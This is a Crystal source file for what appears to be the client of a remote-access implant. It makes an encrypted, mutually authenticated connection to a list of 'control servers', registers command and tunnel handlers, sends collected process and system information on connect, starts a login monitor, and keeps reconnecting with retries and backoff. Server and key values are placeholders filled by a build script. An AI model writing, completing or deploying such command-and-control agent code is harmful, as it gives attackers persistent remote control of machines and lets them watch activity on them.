require "./src/protocol.cr"
require "./src/rfc8439.cr"
require "./src/crypto/curve25519.cr"
require "./src/tunnel/session.cr"
require "./src/utils/sysinfo.cr"
require "./src/utils/tcpsock.cr"
require "./src/handlers/commands.cr"
require "./src/handlers/tunnel.cr"

# ── Identity (compile-time constants) ────────────────────────────────────
# Populated by tools/build_client.rb or manually from: ruby keys/generate.rb
TRUSTED_SERVER_KEYS = [
  "",
].map { |hex| hex.hexbytes }

CLIENT_PRIVATE_KEY = ""
CLIENT_IDENTITY    = Crypto::Ed25519::KeyPair.new(CLIENT_PRIVATE_KEY.hexbytes)

# ── Control servers (tried in order) ────────────────────────────────────
# Each entry is {host, port}. The daemon cycles through them on failure.
SERVERS = [
  {host: "127.0.0.1", port: 32435},
] of NamedTuple(host: String, port: Int32)

RESPECT_TRIES = true

class ProtocolClient
  getter dispatcher : Dispatcher

  RECV_TIMEOUT = 45.seconds

  def initialize(@host : String, @port : Int32,
                 @identity : Crypto::Ed25519::KeyPair,
                 @trusted_server_keys : Array(Bytes))
    @sock = SocketManager.new(@host, @port, connect_timeout: 5.seconds)
    @session = Diffie::Session.new(Diffie::Role::Client)
    @dispatcher = Dispatcher.new
    @running = false
    @last_recv = Time.utc
  end

  def connect : Nil
    @sock.connect

    # X25519 key exchange
    @sock.send_bytes(@session.local_public_key)
    peer = Bytes.new(Diffie::PUBKEY_BYTES)
    @sock.receive_fully(peer)
    @session.complete_handshake(peer)

    # Mutual auth: read server challenge, verify, send response
    challenge_record = read_one_record
    challenge = @session.decrypt(challenge_record)
    @session.verify_auth(challenge, @trusted_server_keys)

    response = @session.create_auth(@identity)
    @sock.send_bytes(Diffie::Framing.frame(@session.encrypt(response)))

    @running = true
    @last_recv = Time.utc
    spawn read_loop
    spawn recv_watchdog
  end

  def send(env : Envelope) : Nil
    send_raw(env.to_json.to_slice)
  end

  def send(action : String) : Nil
    send(Envelope.new(action))
  end

  def send(action : String, payload : Hash(String, String)) : Nil
    wrapped = payload.transform_values { |v| JSON::Any.new(v) }
    send(Envelope.new(action, payload: JSON::Any.new(wrapped)))
  end

  def send_raw(data : Bytes) : Nil
    @sock.send_bytes(Diffie::Framing.frame(@session.encrypt(data)))
  end

  def disconnect : Nil
    @running = false
    @sock.close
  end

  def running? : Bool
    @running
  end

  def on(action : String, &block : Dispatcher::Handler)
    @dispatcher.on(action, &block)
  end

  def on_unhandled(&block : Dispatcher::Handler)
    @dispatcher.on_unhandled(&block)
  end

  def prepare_reconnect(host : String? = nil, port : Int32? = nil) : Nil
    @running = false
    @sock.disconnect rescue nil
    @host = host if host
    @port = port if port
    @sock = SocketManager.new(@host, @port, connect_timeout: 5.seconds)
    @session = Diffie::Session.new(Diffie::Role::Client)
  end

  def current_server : {String, Int32}
    {@host, @port}
  end

  private def read_one_record : Bytes
    header = Bytes.new(Diffie::Framing::HEADER_SIZE)
    @sock.receive_fully(header)
    length = IO::ByteFormat::BigEndian.decode(UInt32, header)
    raise Diffie::Error.new("frame length out of range") if length == 0 || length > Diffie::Framing::MAX_FRAME
    record = Bytes.new(length)
    @sock.receive_fully(record)
    record
  end

  private def read_loop
    parser = Diffie::FrameParser.new
    buffer = Bytes.new(4096)

    while @running
      n = @sock.receive_bytes(buffer)
      break if n.nil?

      @last_recv = Time.utc
      parser.feed(buffer[0, n]) do |record|
        plaintext = @session.decrypt(record)
        @dispatcher.dispatch(plaintext)
      end
    end
  rescue ex : Transport::Error
    STDERR.puts "[transport #{ex.id}] #{ex.message}" if @running
  rescue ex : Diffie::Error
    STDERR.puts "[protocol] #{ex.message}" if @running
  ensure
    @running = false
  end

  private def recv_watchdog
    while @running
      sleep 10.seconds
      next unless @running

      if Time.utc - @last_recv > RECV_TIMEOUT
        STDERR.puts "[!] no data from server in #{RECV_TIMEOUT.total_seconds.to_i}s, assuming dead"
        @running = false
        @sock.close rescue nil
        break
      end
    end
  end
end

# ── main ──────────────────────────────────────────────────────────────────────

MAX_RETRIES   = 3
RETRY_DELAY   = 3.seconds
BACKOFF_DELAY = 5.minutes

server_idx = 0
srv = SERVERS[server_idx]
client = ProtocolClient.new(srv[:host], srv[:port], CLIENT_IDENTITY, TRUSTED_SERVER_KEYS)

Handlers.register(client)
TunnelHandler.register(client)

client.on("ping") do |env|
  client.send("pong", {"time" => Time.utc.to_s})
end

client.on("message") do |env|
  if text = env.payload.try(&.["text"]?.try(&.as_s))
    STDERR.puts "[server] #{text}"
  end
end

client.on_unhandled do |env|
  STDERR.puts "[unhandled] event=#{env.event} payload=#{env.payload}"
end

daemon_running = true
Signal::INT.trap { daemon_running = false }
Signal::TERM.trap { daemon_running = false }

host_failures = 0
total_failures = 0

while daemon_running
  host, port = client.current_server

  begin
    client.connect
    STDERR.puts "[+] connected to #{host}:#{port}"
    client.send("stablish", Sysinfo.collect_process)
    LoginMonitor.start(client)
    host_failures = 0
    total_failures = 0

    while client.running? && daemon_running
      sleep 1.second
    end

    break unless daemon_running
    STDERR.puts "[!] connection lost"
  rescue ex : Transport::Error
    STDERR.puts "[!] #{host}:#{port} — #{ex.message}"
  rescue ex : Diffie::Error
    STDERR.puts "[!] #{host}:#{port} — #{ex.message}"
  end

  LoginMonitor.stop
  host_failures += 1

  advance = RESPECT_TRIES ? host_failures >= MAX_RETRIES : true

  if advance
    host_failures = 0
    server_idx = (server_idx + 1) % SERVERS.size
    total_failures += 1

    if total_failures >= SERVERS.size
      STDERR.puts "[!] all #{SERVERS.size} server(s) exhausted, backing off #{BACKOFF_DELAY.total_seconds.to_i}s..."
      BACKOFF_DELAY.total_seconds.to_i.times do
        break unless daemon_running
        sleep 1.second
      end
      total_failures = 0
      break unless daemon_running
    end
  else
    delay = RETRY_DELAY.total_seconds.to_i
    STDERR.puts "[*] retry #{host_failures}/#{MAX_RETRIES} on #{host}:#{port} in #{delay}s..."
    delay.times do
      break unless daemon_running
      sleep 1.second
    end
  end

  break unless daemon_running
  next_srv = SERVERS[server_idx]
  client.prepare_reconnect(next_srv[:host], next_srv[:port])
end

LoginMonitor.stop
client.disconnect rescue nil
STDERR.puts "[-] disconnected"
